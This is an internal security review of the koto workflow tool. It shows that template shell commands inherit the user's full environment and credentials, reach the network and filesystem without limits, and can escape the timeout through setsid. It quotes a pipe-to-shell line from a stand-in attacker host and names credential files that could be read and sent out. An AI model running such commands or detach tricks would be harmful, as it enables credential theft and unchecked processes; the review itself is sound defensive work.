# Lead: What can a koto template actually do to the machine it runs on?

## Findings

### 1. Execution environment

Every shell command a template can trigger — a default action or a command
gate — goes through the single function `run_shell_command` in
`src/action.rs:26-107`. It builds the child with:

```rust
let mut cmd = Command::new("sh");
cmd.arg("-c").arg(command)
    .current_dir(working_dir)
    .stdout(Stdio::piped())
    .stderr(Stdio::piped());
```

(`src/action.rs:33-38`)

- **Environment**: `Command` never calls `.env_clear()` or `.env_remove()`,
  so the child inherits the parent process's entire environment by default —
  every variable in `koto`'s own environment, unfiltered. Verified
  empirically: a minimal Rust program using the identical `Command` builder
  (no piped stdout override needed to prove the point) inherited
  `GH_TOKEN` and `SSH_AUTH_SOCK` set in the parent shell, plus 90 other
  ambient variables. `ANTHROPIC_API_KEY`, a signed-in `gh` token, an SSH
  agent socket, cloud credentials sourced into the shell profile — anything
  present in the environment `koto next`/`koto init` runs in is visible to
  every one-shot action and every command gate.
- **Stdin**: only `stdout` and `stderr` are redirected to pipes
  (`src/action.rs:37-38`); `stdin` is left untouched, so `Command`'s default
  applies — the child inherits the parent's stdin. A command can read from
  whatever `koto`'s own stdin is (a terminal, a pipe from an orchestrating
  agent, etc.).
- **Process group**: `pre_exec` calls `libc::setpgid(0, 0)` (`src/action.rs:42-46`),
  putting the child in a new process group headed by itself. This is what
  makes the timeout kill possible (below) — it is an isolation mechanism for
  cleanup, not a security boundary.
- **User identity**: no `uid`/`gid` manipulation anywhere in `action.rs`. The
  command runs as whatever user is running `koto` — full permissions of that
  account, including root if `koto` is (mis)run as root.
- **Working directory**: `current_dir(working_dir)` — the directory passed
  in by the caller. For the default-action path, that's `wd` in
  `src/cli/mod.rs:3977-3981`, which falls back to
  `current_dir = std::env::current_dir()?` (`src/cli/mod.rs:3082`) when the
  action declares no `working_dir` — i.e., wherever `koto next` was invoked
  from. Nothing in `action.rs` restricts the command to staying inside that
  directory once it's running; `cd`, absolute paths, `~`, and `/` are all
  available to the command itself.

In short: full ambient environment, inherited stdin, a fresh process group
(cleanup-only), the invoking user's full identity, and a working directory
that's a starting point, not a jail.

### 2. What the existing bounds actually stop

- **30-second default timeout.** `DEFAULT_TIMEOUT_SECS: u64 = 30`
  (`src/action.rs:12`), used whenever `timeout_secs == 0`. This bounds wall
  time for commands that run to completion in the foreground — it stops a
  runaway `sleep 999` or a hung foreground process from blocking the
  workflow forever. Gates can override it (`Gate.timeout`,
  `src/template/types.rs:161-163`, `gate.timeout` passed at
  `src/gate.rs:203`). One-shot `default_action` commands **cannot** override
  it: `ActionDecl` (`src/template/types.rs:200-208`) has no timeout field at
  all, and the call site hardcodes it —
  `crate::action::run_shell_command(&command, &wd, 30)` at
  `src/cli/mod.rs:4021` (also used inside the polling loop's per-iteration
  execution). A template author cannot ask for a longer *or* shorter one-shot
  timeout; 30 seconds is fixed for that path.
- **Process-group kill on timeout.** `libc::killpg(pid, SIGKILL)`
  (`src/action.rs:88-92`) fires only when `wait_timeout` returns `Ok(None)`
  — i.e., only on the timeout path, never on normal completion. Empirically
  confirmed with three cases mirroring the exact `setpgid`/`killpg` sequence:
  1. A backgrounded job (`(sleep 3; touch marker) & exit 0`) inside a command
     that exits *before* the timeout: koto's function returns immediately: the
     background job is never touched and completes on its own after the
     parent has already been reported done. **A command that finishes fast
     but leaves work running behind it is never bounded by the timeout at
     all** — timeout only ever fires on hang, not on detach-and-return.
  2. A `setsid`-detached child, killed via the outer command timing out: the
     `setsid` child gets its own session and process group, so `killpg` on
     the *original* pgid never reaches it. The child's `touch marker`
     completed 5 seconds later, fully surviving the kill.
  3. A plain background child *without* `setsid`, same-timeout scenario: it
     shares the process group `setpgid(0,0)` created, so `killpg` does reach
     it and it's reaped. This is the case the mechanism was built for, and
     it works as designed.

  So: the process-group kill stops a *foreground, same-group* runaway
  process. It does not stop, and was never designed to stop, a command that
  intentionally detaches (`setsid`, `disown`, `nohup … &`, double-fork) or
  one that simply finishes before the clock runs out while leaving
  background work behind.
- **Output cap.** `MAX_ACTION_OUTPUT_BYTES: usize = 64 * 1024`
  (`src/cli/mod.rs:61`), applied via `truncate_output`
  (`src/cli/mod.rs:833-844`) only to the default-action path, at
  `src/cli/mod.rs:4025-4026`, right before the truncated text is written into
  the `DefaultActionExecuted` event. This bounds how much of a command's
  stdout/stderr gets persisted into the session log and shown to the agent —
  it stops the log from growing unboundedly and stops a huge blob from
  flooding downstream context. It does **not** apply to command gates:
  `evaluate_command_gate` (`src/gate.rs:203-232`) only ever surfaces
  `exit_code` and, on a non-timeout error, the raw `output.stderr` verbatim
  in the gate's JSON output (`src/gate.rs:216-219`) — unbounded. It also
  says nothing about what the command did on disk or over the network before
  producing that output; the cap is a log-hygiene control, not a containment
  control.
- **The `--var` character allowlist** (`VALUE_PATTERN` in
  `src/engine/substitute.rs:29`, `^[a-zA-Z0-9._/:@ \-]*$`) blocks shell
  metacharacters (`;`, `|`, `&`, `` ` ``, `$`, `(`, `)`, `>`, `<`, `*`,
  quotes, backslash, newline — see the rejection tests at
  `src/engine/substitute.rs:217-235`) from appearing in a *substituted
  value*. This is enforced twice: once at `koto init --var` time and again
  as "defense in depth" when the value is re-extracted from the
  `WorkflowInitialized` event and re-validated (`Variables::from_events`,
  `src/engine/substitute.rs:60-75`). It stops a variable value from turning
  one shell word into a command-injection vector, or from producing a
  broken command via an empty unquoted token (`substitute_command`'s `''`
  handling, `src/engine/substitute.rs:94-101`, Issue #186). **It says
  nothing about the template's own command string.** The allowlist runs
  over `{{KEY}}` substitutions only; a template author's `action.command =
  "curl -s https://evil.example/x | sh"` is untouched by it, because that
  text never passes through `validate_value`.
- **Compile-time validation** (`src/template/types.rs`, `src/config/validate.rs`).
  `src/config/validate.rs` is unrelated to command safety — it's an
  allowlist of *project-config keys* (`session.backend`, etc.) that keeps
  credentials out of a committed `.koto/config.toml`
  (`src/config/validate.rs:4-9`). The actual template-compile check relevant
  here is `extract_refs` (`src/template/types.rs:13-14`,
  `VAR_REF_PATTERN = r"\{\{([A-Z][A-Z0-9_]*)\}\}"`), applied to
  `state.directive`, `gate.command`, `action.command`, and
  `action.working_dir` (`src/template/types.rs:782,795,824,835`) — it
  rejects a template that references an undeclared `{{VAR}}`. That is the
  entire scope of compile-time validation on commands: **it never inspects
  what the command string actually says.** There is no allowlist of
  binaries, no static check for `rm`, `curl`, `sudo`, pipe-to-shell, or
  anything else. A template's `command` field is free-form shell, full stop.

### 3. What is unbounded

Everything not covered above, which is most of what a real machine offers:

- **Network access**: no restriction anywhere in `action.rs` or its callers.
  A command can make arbitrary outbound connections — upload files, call
  webhooks, exfiltrate anything it can read.
- **Filesystem access outside the working directory**: `current_dir` only
  sets the *starting* directory for `sh -c`; the command can `cd`,
  reference absolute paths, write to `$HOME`, `/tmp`, or any path the
  invoking user can reach. Nothing chroots or sandboxes it.
- **`sudo` / privilege escalation**: available if the invoking user has
  `sudo` rights (interactively that usually needs a password, but a
  passwordless `sudo` rule or a cached credential removes even that
  friction) — koto imposes no restriction either way.
- **Package installation, arbitrary binary execution**: `sh -c` can invoke
  any binary on `$PATH`, install more software, or download and execute a
  fetched payload. No allowlist of commands or binaries exists.
- **Reading and exfiltrating credentials**: since the full environment is
  inherited (Finding 1) and the filesystem is reachable beyond the working
  directory, a command can read `~/.ssh/id_ed25519`, `~/.aws/credentials`,
  `~/.netrc`, cloud CLI token caches, or dump `env` itself, and then send
  any of that off-box over the unrestricted network path above. Nothing
  koto does — allowlist, timeout, output cap, or otherwise — touches this.
- **Long-running background/daemonized processes that outlive the timeout**:
  confirmed empirically above (Finding 2, cases 1 and 2). A command that
  backgrounds work and returns quickly is never touched by the timeout at
  all; a command that gets caught by the timeout but has already detached
  via `setsid` (or an equivalent double-fork/session-break) survives the
  `killpg`. Process-group kill only reaps a hung, *same-group* foreground
  process — it does not reap a daemonized child in either the "fast return"
  or the "detached-then-killed" case.
- **Recursion into other repositories**: nothing scopes a command to the
  repo or working tree the session is nominally about; combined with the
  no-directory-binding fact already established (session isn't bound to a
  tree — the working directory is just wherever `koto next` was invoked
  from, or whatever the action's `working_dir` field says), a command can
  walk into sibling repos, other worktrees, or anything else reachable from
  the filesystem.

### 4. Two threat shapes, kept separate

**(a) The careless template.** A well-meaning author writes
`rm -rf {{BUILD_DIR}}` and `BUILD_DIR` resolves empty, or writes a command
that works on their machine (assumes a tool is installed, assumes a
directory exists, assumes it's running from a specific tree) and is
destructive when those assumptions don't hold elsewhere.

- *Helps*: the `--var` allowlist indirectly helps here too, but for a
  different reason than injection — `substitute_command`'s empty-value
  handling (`src/engine/substitute.rs:94-101`, Issue #186) turns an empty
  unquoted `{{VAR}}` into an explicit `''` argument rather than letting it
  vanish and shift subsequent flags, which is exactly the shape of bug that
  turns `rm -rf {{BUILD_DIR}}/*` into `rm -rf /*`-adjacent disasters from a
  dropped argument. The 30-second timeout and process-group kill contain a
  command that hangs instead of running away. The output cap keeps a
  runaway log from swallowing context.
- *Does not help*: none of the above stops the command from doing what it
  says once it's a well-formed, non-hanging invocation. `rm -rf
  {{BUILD_DIR}}` with `BUILD_DIR` correctly substituted to the wrong path
  runs to completion, exits 0, and the timeout/kill/cap never engage because
  nothing about it was slow or oversized. There's no dry-run mode, no
  confirmation gate keyed to destructive-looking commands (only the
  unrelated `requires_confirmation` flag on `ActionDecl`,
  `src/template/types.rs:205`, which is opt-in per action and orthogonal to
  detecting danger), no path scoping.

**(b) The hostile template.** Someone with commit access to a plugin (e.g. a
shirabe-shipped workflow JSON), or a template arriving from an untrusted
source/path, embeds a deliberately malicious command.

- *Helps*: essentially nothing above is aimed at this. The `--var`
  allowlist protects substituted *values*, not the *template's own command
  text* — a hostile template author writes the malicious string directly
  into `command`, never through a `{{VAR}}`, so the allowlist has nothing to
  filter. The timeout/kill/cap bound resource usage and log size, not
  intent. Compile-time validation checks variable references, not command
  content.
- *Does not help*: everything in Finding 3 is available to a hostile
  template exactly as it is to a careless one — full environment, full
  filesystem, network, the invoking user's identity. The authority model
  (invoking a koto-backed workflow is the grant) means this is treated as
  in-scope trust, but it's worth being explicit: nothing downstream of
  "this template got loaded" narrows what it can do to the machine.

### 5. Gates share the same execution path — confirmed, not a new exposure

`evaluate_command_gate` (`src/gate.rs:203-232`) calls
`run_shell_command(&gate.command, working_dir, gate.timeout)` — the
identical function used by `default_action` (`src/cli/mod.rs:4021`), same
`sh -c`, same `setpgid`/`killpg`, same full-environment inheritance, same
absence of any command-content validation beyond the `{{VAR}}` allowlist on
substituted values. The only behavioral differences are: gates can set a
non-30s timeout via `Gate.timeout` (`src/template/types.rs:161-163`), and
gate output is *not* passed through `truncate_output` — `evaluate_command_gate`
only ever emits `exit_code` plus, on error, the raw `stderr` string
(`src/gate.rs:216-219`), so the 64KB cap that exists for actions has no
counterpart for gates at all.

This means: everything in Findings 1-4 already describes shirabe's 11
shipped command gates today, running in every workflow that uses them
(confirmed present in shirabe's koto workflow templates, e.g.
`skills/execute/evals/fixtures/scenarios/e2e-resume-plan/koto-workflows.json`
and sibling fixture files). Adopting `default_action` for new templates adds
more call sites to the same execution primitive; it does not introduce a
new class of capability that command gates didn't already have. The
baseline blast radius described here is the current baseline, not a
future one.

### 6. Comparable systems (brief)

CI systems bound what a workflow file can do through controls that mostly
don't map onto a local, single-user developer machine:

- **Ephemeral, disposable runners** (GitHub Actions-hosted runners, most
  CI-as-a-service): the workflow's blast radius is capped because the whole
  machine is thrown away after the job. Not applicable here — `koto` runs
  on the developer's persistent machine by design; there's no ephemeral
  substrate to destroy instead of the real one.
- **Explicit permission scopes** (`GITHUB_TOKEN` permissions block, OIDC
  scoped tokens): these bound what *credentials* a job can use, independent
  of what shell commands it can run. Somewhat applicable in spirit — koto
  has no equivalent concept of scoping which ambient credentials a given
  workflow/state is allowed to see, since it inherits everything
  unconditionally (Finding 1).
- **Sandboxing/container isolation** (Actions runs in a container or VM
  already; other CI systems add gVisor/Firecracker-style isolation): bounds
  filesystem and kernel-level blast radius. Applicable in principle
  (namespaces, containers, or a restricted shell wrapper could bound a
  koto-spawned command the same way), but a real design choice with real
  cost — it's the kind of control that would need to be added deliberately,
  not something implied by the current architecture.
- **Allowlisted actions / pinned SHAs**: bounds *which* third-party code can
  run at all, and pins it against silent updates. The closest analogue for
  koto would be validating or provenance-checking a template before it's
  trusted to run — not currently done anywhere in the reviewed code, and
  orthogonal to what happens once a command executes.

None of these are proposed here as something to copy; they're listed only
to show which categories of control exist elsewhere and which of them
correspond to something koto could add without touching the authority
model (the last two) versus which assume a different execution substrate
entirely (the first one).

## Implications

The practical blast radius of a koto template is: everything the invoking
user's account can do on that machine, unbounded by network, filesystem
location, or privilege level, with the full ambient environment (secrets
included) handed to every command. The three controls that exist —
30-second timeout (one-shot commands only, not configurable), process-group
kill on timeout, and a 64KB output cap on action logging — are narrow
tools aimed at hygiene (don't hang forever, don't flood the log), not
containment (don't reach outside a boundary). The `--var` allowlist is a
real, working control, but for a narrowly scoped problem: it stops a
*substituted value* from becoming an injection vector or corrupting a
command's argv; it has no jurisdiction over the command string a template
author writes directly. Compile-time validation checks that variables are
declared, not that commands are safe.

This is the same envelope for command gates as for `default_action` — the
11 gates shirabe ships today already sit inside it, running with the same
inherited environment and the same absence of content validation. Adopting
`default_action` more broadly doesn't create a new exposure; it adds more
templates that exercise the exposure that command gates already have.

## Surprises

- The one-shot `default_action` timeout is not just defaulted to 30
  seconds, it's *hardcoded* to 30 at the call site
  (`src/cli/mod.rs:4021`) — `ActionDecl` has no `timeout` field at all
  (`src/template/types.rs:200-208`). A template author who genuinely needs
  a one-shot command to run for 2 minutes has no way to ask for that
  except by using the polling machinery.
- The output cap (`MAX_ACTION_OUTPUT_BYTES`) protects the action-executed
  event log but has no counterpart for command gates: `evaluate_command_gate`
  passes raw, unbounded `stderr` straight into the gate's JSON output on
  error (`src/gate.rs:216-219`).
- The process-group kill is defeated trivially and by design, not by an
  edge case: a single `setsid` prefix on a backgrounded command is enough
  to survive `killpg`, confirmed empirically. And a command that
  backgrounds work and returns before the 30-second clock even starts
  counting against it is never subject to the kill at all — the mechanism
  only ever activates on the timeout path.

## Open Questions

- Is there an appetite for adding *any* environment scoping (e.g., an
  explicit allowlist of env vars passed to spawned commands) given how
  cheaply it would cut the credential-exposure surface without touching the
  authority model, or is "the invoking grant already includes ambient
  credentials" the settled position?
- Should `ActionDecl` gain a `timeout_secs` field mirroring `Gate.timeout`,
  independent of any decision about raising the default — purely so a
  one-shot action isn't structurally forced into using polling for
  legitimate longer-running work?
- Should gate error output go through the same `truncate_output` cap that
  actions already get, for consistency and log-size hygiene?

## Summary
A koto-spawned command — from a `default_action` or any of the 11 command
gates shirabe ships — runs as `sh -c` with the invoking user's full
identity, complete inherited environment (secrets included), unrestricted
filesystem and network access, and only a 30-second timeout, a
process-group kill, and (for actions only) a 64KB log cap standing between
it and the machine; empirically, a `setsid`-detached or simply
fast-returning backgrounded process defeats the kill entirely. The `--var`
allowlist and compile-time checks guard against injection through
substituted values and undeclared variables respectively, but neither
inspects or bounds what a template's own command string says or does, so
neither the careless-template nor the hostile-template case is meaningfully
contained today. This is the existing baseline for command gates, not a new
exposure from adopting `default_action`.
